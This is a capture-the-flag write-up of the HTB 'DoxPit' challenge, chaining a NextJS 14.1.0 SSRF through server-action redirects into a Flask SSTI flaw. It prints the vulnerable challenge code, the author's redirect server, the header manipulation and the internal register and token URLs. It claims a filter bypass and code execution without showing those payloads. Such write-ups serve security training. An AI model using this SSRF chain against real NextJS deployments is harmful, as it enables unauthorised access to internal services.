---
title: Solving DoxPit Challenge
published: true
---

## [HTB] Solving DoxPit Challenge

![IMG_LOGO](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tWUMuT1J0TUSBua9hOmWcg.png)

In this write-up, I’ll walk you through the process of solving the HTB DoxPit challenge.

This challenge features a mix of vulnerabilities in both a Flask app and a NextJS application. Through a series of methodical steps, I’ll show you how to exploit these vulnerabilities and successfully capture the flag.

Let’s dive into the details!

---

## Getting Started

The first step in tackling the DoxPit challenge was to download the provided challenge code. This code revealed two distinct folders: one for a NextJS app and the other for a Flask app.

The Flask app, running locally, was vulnerable to **Server-Side Template Injection (SSTI)** due to its use of `render_template_string`:

```python
@web.route("/home", methods=["GET", "POST"])
@auth_middleware
def feed():
    directory = request.args.get("directory")
    
    if not directory:
        dirs = os.listdir(os.getcwd())
        return render_template("index.html", title="home", dirs=dirs)

    if any(char in directory for char in invalid_chars):
        return render_template("error.html", title="error", error="invalid directory"), 400

    try:
        with open("./application/templates/scan.html", "r") as file:
            template_content = file.read()
            results = scan_directory(directory)
            template_content = template_content.replace("{{ results.date }}", results["date"])
            template_content = template_content.replace("{{ results.scanned_directory }}", results["scanned_directory"])
            return render_template_string(template_content, results=results)
        
    except Exception as e:
        return render_template("error.html", title="error", error=e), 500
```

However, since this app was running locally, our only access was through the **NextJS app**, which provided the user interface (UI).

---

## Identifying the SSRF Vulnerability

I took a look at the `package.json` file of the NextJS app and saw that it was using version **14.1.0**.

This version is known to be vulnerable to **Server-Side Request Forgery (SSRF)** when using the `redirect` function from `next/navigation`.

Specifically, I found that the `doRedirect` function in `serverAction.tsx`, which was used in the home page posts links, utilized this function:

```js
"use server";

import { redirect } from "next/navigation";

export async function doRedirect() {
    redirect("/error");
}

<form action={doRedirect}>
    <button className="link-light" type="submit">{paste.title}</button>
</form>
```

---

## Exploiting SSRF

To exploit this vulnerability, I began by intercepting requests from the home page using **Burp Suite**. The goal was to modify the `Host` and `Origin` headers to point to my server.

Before diving into this, I added **Burp Collaborator** to test if I would receive any requests from the application.

This step was crucial to confirm that the application was interacting with my server as expected.

![IMG_1](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OIhA8_i0n-duq8g0sNJEVA.png)

And yep, got it 🎉

![IMG_2](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vAubxr_uxPh000PCWOZjpg.png)

I then configured Burp Suite to respond with a **302 redirect** to `0.0.0.0:3000`.

To test this, I set up a simple Flask application to serve as a local endpoint:

```python
from flask import Flask, Response, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect('http://0.0.0.0:3000')
```

---

## Accessing the Internal App

After configuring **Burp Suite** to redirect requests to this local Flask server, I was able to access the internal Flask application running on **port 3000**.

![IMG_3](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SuGoOgMNjUgZC0tKqx-joA.png)

The next step was to interact with the application, starting by registering a new account, as the application required registration for further actions.

The registration endpoint allowed us to create an account using a simple GET request:

```python
@web.route("/register", methods=["GET"])
def register():
    username = request.args.get("username")
    password = request.args.get("password")

    if not username or not password:
        return render_template("register.html", title="register")

    db_session = Database()
    token = generate(16)
    user_valid = db_session.create_user(username, password, token)
    if not user_valid:
        return render_template("error.html", title="error", error="user exists"), 401

    return render_template("error.html", title="success", error=f"User created with token: {token}"), 200
```

So I changed my server to point to:

```
http://0.0.0.0:3000/register?username=kebda&password=3afroto
```

With the account successfully created, the application returned a **session token**.

![IMG_4](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RcpX5mpj9R-BJDQ5JzBZ3A.png)

Using this token, I could now authenticate and access protected areas of the application by appending the token to the URL:

```
http://0.0.0.0:3000/home?token=c84964fbd5a45090c841695b2a7d8530
```

---

## Conclusion

Through a combination of **SSRF** and **SSTI**, I was able to:
- Exploit **NextJS SSRF** to interact with the internal Flask application.
- Bypass input filters to execute **SSTI payloads**.
- Gain **remote code execution** and retrieve the flag.

![IMG_11](https://miro.medium.com/v2/resize:fit:1400/format/webp/1*A3zR-rBM2mstqTg5zxvU8w.png)

And that’s it!

**Bye UwU** 😸

